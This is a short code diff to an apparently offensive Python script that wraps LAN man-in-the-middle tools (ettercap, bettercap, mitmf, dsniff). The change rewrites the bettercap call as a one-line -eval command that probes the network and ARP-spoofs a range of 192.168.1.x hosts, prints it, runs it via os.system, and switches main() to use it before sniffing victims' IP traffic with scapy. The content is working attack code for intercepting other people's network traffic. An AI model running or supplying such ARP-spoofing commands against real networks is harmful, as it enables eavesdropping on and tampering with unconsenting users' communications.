@@ -31,13 +31,10 @@ def ettercap():
 
 
 def bettercap():
-	cmd = """
-	bettercap -caplet /dev/stdin <<< '
-		net.probe on
-		set arp.spoof.targets 192.168.1.{}-{}
-		arp.spoof on
-		' > /dev/null 2> /dev/null & 
+	cmd = """ 
+	bettercap -eval "net.probe on; set arp.spoof.targets 192.168.1.{}-{}; arp.spoof on"
 	""".format(*IP_RANGE)
+	print(cmd)
 	os.system(cmd)
 	
 def mitmf():
@@ -66,8 +63,8 @@ def dsniff():
 	os.system(cmd)
 
 def main():
-	dsniff()
-	#bettercap()
+	#dsniff()
+	bettercap()
 	#mitmf()
 	try:
 		sniff(filter="ip", prn=wait_all_victims)
